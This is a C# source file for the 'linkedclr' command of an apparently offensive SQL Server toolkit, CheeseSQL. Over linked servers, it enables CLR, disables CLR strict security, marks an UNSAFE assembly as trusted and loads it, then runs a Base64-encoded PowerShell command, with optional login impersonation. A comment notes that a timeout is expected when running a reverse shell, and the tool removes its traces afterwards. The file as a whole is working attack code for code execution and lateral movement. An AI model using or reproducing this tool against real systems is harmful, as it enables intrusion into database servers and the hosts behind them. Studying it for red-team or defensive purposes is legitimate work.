using CheeseSQL.Helpers;
using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.IO;

namespace CheeseSQL.Commands
{
    public class linkedclr : ICommand
    {
        public static string CommandName => "linkedclr";

        public string Description()
        {
            return $"[*] {CommandName}\r\n" +
                   $"  Description: Execute Encoded PowerShell Command on Linked SQL Server via custom .NET assemblies";
        }

        public string Usage()
        {
            return $"{Description()}\r\n  " +
                $"Usage: {System.Reflection.Assembly.GetExecutingAssembly().GetName().Name} {CommandName} " +
                $"/db:DATABASE " +
                $"/server:SERVER " +
                $"/target:TARGET " +
                $"/command:COMMAND " +
                $"/assembly:DLL " +
                $"/class:CLASS " +
                $"/method:METHOD " +
                $"[/compile] " +
                $"[/impersonate:USER] " +
                $"[/impersonate-linked:USER] " +
                $"[/sqlauth /user:SQLUSER /password:SQLPASSWORD]";
        }

        public void Execute(Dictionary<string, string> arguments)
        {

            string user = "";
            string password = "";
            string connectInfo = "";
            string database = "";
            string connectserver = "";
            string target = "";
            string assembly = "";
            string clazz = "";
            string cmd = "";
            string method = "";
            string impersonate = "";
            string impersonate_linked = "";

            bool sqlauth = false;
            bool compile = false;

            if (arguments.ContainsKey("/sqlauth"))
            {
                sqlauth = true;
            }
            if (arguments.ContainsKey("/db"))
            {
                database = arguments["/db"];
            }
            if (arguments.ContainsKey("/impersonate"))
            {
                impersonate = arguments["/impersonate"];
            }
            if (arguments.ContainsKey("/impersonate-linked"))
            {
                impersonate_linked = arguments["/impersonate-linked"];
            }
            if (arguments.ContainsKey("/server"))
            {
                connectserver = arguments["/server"];
            }
            if (arguments.ContainsKey("/target"))
            {
                target = arguments["/target"];
            }
            if (arguments.ContainsKey("/command"))
            {
                cmd = arguments["/command"];
            }
            if (arguments.ContainsKey("/compile"))
            {
                compile = true;
            }
            if (arguments.ContainsKey("/assembly"))
            {
                assembly = arguments["/assembly"];
            }
            if (arguments.ContainsKey("/command"))
            {
                cmd = arguments["/command"];
            }
            if (arguments.ContainsKey("/class"))
            {
                clazz = arguments["/class"];
            }
            if (arguments.ContainsKey("/method"))
            {
                method = arguments["/method"];
            }
            if (String.IsNullOrEmpty(database))
            {
                Console.WriteLine("\r\n[X] You must supply a database!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(connectserver))
            {
                Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(target))
            {
                Console.WriteLine("\r\n[X] You must supply a target server!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(assembly) && !compile)
            {
                Console.WriteLine("\r\n[X] You must supply an assembly name, path, url, or choose the `compile` option\r\n");
                return;
            }
            else if (String.IsNullOrEmpty(assembly) && compile)
            {
                assembly = Path.GetFileNameWithoutExtension(Path.GetTempFileName());
            }
            if (String.IsNullOrEmpty(cmd))
            {
                Console.WriteLine("\r\n[X] You must supply a command to execute (PS Base64 Encoded)!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(clazz))
            {
                clazz = "StoredProcedures";
            }
            if (String.IsNullOrEmpty(method))
            {
                method = StringUtils.RandomString(10);
            }


            if (sqlauth)
            {
                if (arguments.ContainsKey("/user"))
                {
                    user = arguments["/user"];
                }
                if (arguments.ContainsKey("/password"))
                {
                    password = arguments["/password"];
                }
                if (String.IsNullOrEmpty(user))
                {
                    Console.WriteLine("\r\n[X] You must supply the SQL account user!\r\n");
                    return;
                }
                if (String.IsNullOrEmpty(password))
                {
                    Console.WriteLine("\r\n[X] You must supply the SQL account password!\r\n");
                    return;
                }
                connectInfo = "Data Source= " + connectserver + "; Initial Catalog= " + database + "; User ID=" + user + "; Password=" + password;
            }
            else
            {
                connectInfo = "Server = " + connectserver + "; Database = " + database + "; Integrated Security = True;";
            }

            SqlConnection connection = new SqlConnection(connectInfo);

            try
            {
                connection.Open();
                Console.WriteLine($"[+] Authentication to the '{database}' Database on '{connectserver}' Successful!");
            }
            catch
            {
                Console.WriteLine($"[-] Authentication to the '{database}' Database on '{connectserver}' Failed.");
                return;
            }

            Console.WriteLine("[*] Loading assembly..");

            string hash;
            string hexData = AssemblyLoader.LoadAssembly(assembly, out hash, clazz, method, compile);
             
            Console.WriteLine("[*] Enabling Advanced options..");
            string enableAdvOptions = $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [{target}]";

            if (!String.IsNullOrEmpty(impersonate_linked))
            {
                enableAdvOptions = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [{target}]";
            }


            if (!String.IsNullOrEmpty(impersonate))
            {
                enableAdvOptions = $"EXECUTE AS LOGIN = '{impersonate}' {enableAdvOptions}";
            }

            SqlCommand command = new SqlCommand(enableAdvOptions, connection);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            reader.Close();

            Console.WriteLine("[*] Enabling CLR..");
            string baseCmd = $"sp_configure ''clr enabled'', 1; RECONFIGURE;";
            string enableCLR = $"EXEC ('{baseCmd}') AT [{target}]";
            if (!String.IsNullOrEmpty(impersonate_linked))
            {
                enableCLR = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXEC {baseCmd}') AT [{target}]";
            }

            if (!String.IsNullOrEmpty(impersonate))
            {
                enableCLR = $"EXECUTE AS LOGIN = '{impersonate}' {enableCLR}";
            }
            command = new SqlCommand(enableCLR, connection);
            reader = command.ExecuteReader();
            reader.Read();
            reader.Close();

            Console.WriteLine("[*] Disabling CLR Security..");
            baseCmd = $"sp_configure ''clr strict security'', 0; RECONFIGURE;";
            string disableCLRSecurity = $"EXEC ('{baseCmd}') AT [{target}]";
            if (!String.IsNullOrEmpty(impersonate_linked))
            {
                disableCLRSecurity = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXEC {baseCmd}') AT [{target}]";
            }

            if (!String.IsNullOrEmpty(impersonate))
            {
                disableCLRSecurity = $"EXECUTE AS LOGIN = '{impersonate}' {disableCLRSecurity}";
            }
            command = new SqlCommand(disableCLRSecurity, connection);
            reader = command.ExecuteReader();
            reader.Read();
            reader.Close();

            Console.WriteLine("[*] Adding assembly to trusted list..");
            baseCmd = $"sp_add_trusted_assembly @hash={hash};";
            string addTrustedAssembly = $"EXEC ('{baseCmd}') AT [{target}]";
            if (!String.IsNullOrEmpty(impersonate_linked))
            {
                addTrustedAssembly = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXEC {baseCmd}') AT [{target}]";
            }

            if (!String.IsNullOrEmpty(impersonate))
            {
                addTrustedAssembly = $"EXECUTE AS LOGIN = '{impersonate}' {addTrustedAssembly}";
            }
            command = new SqlCommand(addTrustedAssembly, connection);
            reader = command.ExecuteReader();
            reader.Read();
            reader.Close();

            Console.WriteLine("[*] Creating assembly {0}..", assembly);
            baseCmd = $"CREATE ASSEMBLY {assembly} FROM {hexData} WITH PERMISSION_SET = UNSAFE;";
            string createAssembly = $"EXEC ('{baseCmd}') AT [{target}]";
            if (!String.IsNullOrEmpty(impersonate_linked))
            {
                createAssembly = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXECUTE(''{baseCmd}'');') AT [{target}]";
            }

            if (!String.IsNullOrEmpty(impersonate))
            {
                createAssembly = $"EXECUTE AS LOGIN = '{impersonate}' {createAssembly}";
            }
            command = new SqlCommand(createAssembly, connection);
            reader = command.ExecuteReader();
            reader.Read();
            reader.Close();

            Console.WriteLine("[*] Creating procedure [{0}].[{1}].[{2}]..", assembly, clazz, method);

            baseCmd = $"CREATE PROCEDURE [dbo].[{method}] @command NVARCHAR (4000) AS EXTERNAL NAME [{assembly}].[{clazz}].[{method}];";
            string createProcedure = $"EXEC ('{baseCmd}') AT [{target}]";
            if (!String.IsNullOrEmpty(impersonate_linked))
            {
                createProcedure = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXECUTE(''{baseCmd}'')') AT [{target}]";
            }

            if (!String.IsNullOrEmpty(impersonate))
            {
                createProcedure = $"EXECUTE AS LOGIN = '{impersonate}' {createProcedure}";
            }
            command = new SqlCommand(createProcedure, connection);
            reader = command.ExecuteReader();
            reader.Read();
            reader.Close();

            baseCmd = $"EXEC {method} ''{cmd}'';";
            string execCmd = $"EXEC ('{baseCmd}') AT [{target}]";
            if (!String.IsNullOrEmpty(impersonate_linked))
            {
                execCmd = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' {baseCmd};') AT [{target}]";
            }

            if (!String.IsNullOrEmpty(impersonate))
            {
                execCmd = $"EXECUTE AS LOGIN = '{impersonate}' {execCmd}";
            }

            try
            {
                command = new SqlCommand(execCmd, connection);
                Console.WriteLine("[*] Executing command..");
                using (reader = command.ExecuteReader())
                {
                    try
                    {
                        reader.Read();
                        Console.WriteLine("[+] Command result: " + reader[0]);
                    }
                    catch { }
                }
            }
            catch (SqlException e)
            {
                if (e.Message.Contains("Execution Timeout Expired"))
                {
                    Console.WriteLine("[*] The SQL Query hit the timeout. If you were executing a reverse shell, this is normal");
                    connection = new SqlConnection(connectInfo);
                    connection.Open();
                }
                else
                {
                    Console.WriteLine($"[-] Exception: {e.Message}");
                    return;
                }
            }

            Console.WriteLine("[*] Drop procedure..");
            baseCmd = $"DROP PROCEDURE [dbo].[{method}];";
            string dropProcedure = $"EXEC ('{baseCmd}') AT [{target}]";
            if (!String.IsNullOrEmpty(impersonate_linked))
            {
                dropProcedure = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXECUTE(''{baseCmd}'')') AT [{target}]";
            }

            if (!String.IsNullOrEmpty(impersonate))
            {
                dropProcedure = $"EXECUTE AS LOGIN = '{impersonate}' {dropProcedure}";
            }
            command = new SqlCommand(dropProcedure, connection);
            reader = command.ExecuteReader();
            reader.Read();
            reader.Close();

            Console.WriteLine("[*] Removing assembly to trusted list..");
            baseCmd = $"sp_drop_trusted_assembly @hash={hash};";
            string dropTrustedAssembly = $"EXEC ('{baseCmd}') AT [{target}]";
            if (!String.IsNullOrEmpty(impersonate_linked))
            {
                dropTrustedAssembly = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXEC {baseCmd}') AT [{target}]";
            }

            if (!String.IsNullOrEmpty(impersonate))
            {
                dropTrustedAssembly = $"EXECUTE AS LOGIN = '{impersonate}' {dropTrustedAssembly}";
            }
            command = new SqlCommand(dropTrustedAssembly, connection);
            reader = command.ExecuteReader();
            reader.Read();
            reader.Close();

            Console.WriteLine("[*] Drop assembly..");
            baseCmd = $"DROP ASSEMBLY [{assembly}]";
            string dropAssembly = $"EXEC ('{baseCmd}') AT [{target}]";
            if (!String.IsNullOrEmpty(impersonate_linked))
            {
                dropAssembly = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXECUTE(''{baseCmd}'')') AT [{target}]";
            }

            if (!String.IsNullOrEmpty(impersonate))
            {
                dropAssembly = $"EXECUTE AS LOGIN = '{impersonate}' {dropAssembly}";
            }
            command = new SqlCommand(dropAssembly, connection);
            reader = command.ExecuteReader();
            reader.Read();
            reader.Close();

            Console.WriteLine("[*] Enabling CLR Security..");
            baseCmd = $"sp_configure ''clr strict security'', 1;";
            string enableCLRSecurity = $"EXEC ('{baseCmd}') AT [{target}]";
            if (!String.IsNullOrEmpty(impersonate_linked))
            {
                enableCLRSecurity = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXEC {baseCmd}') AT [{target}]";
            }

            if (!String.IsNullOrEmpty(impersonate))
            {
                enableCLRSecurity = $"EXECUTE AS LOGIN = '{impersonate}' {enableCLRSecurity}";
            }
            command = new SqlCommand(enableCLRSecurity, connection);
            reader = command.ExecuteReader();
            reader.Read();
            reader.Close();

            Console.WriteLine("[*] Disabling CLR..");
            baseCmd = $"sp_configure ''clr enabled'', 0;";
            string disableCLR = $"EXEC ('{baseCmd}') AT [{target}]";
            if (!String.IsNullOrEmpty(impersonate_linked))
            {
                disableCLR = $"EXEC('EXECUTE AS LOGIN = ''{impersonate_linked}'' EXEC {baseCmd}') AT [{target}]";
            }

            if (!String.IsNullOrEmpty(impersonate))
            {
                disableCLR = $"EXECUTE AS LOGIN = '{impersonate}' {disableCLR}";
            }
            command = new SqlCommand(disableCLR, connection);
            reader = command.ExecuteReader();
            reader.Read();
            reader.Close();

            connection.Close();
        }
    }
}
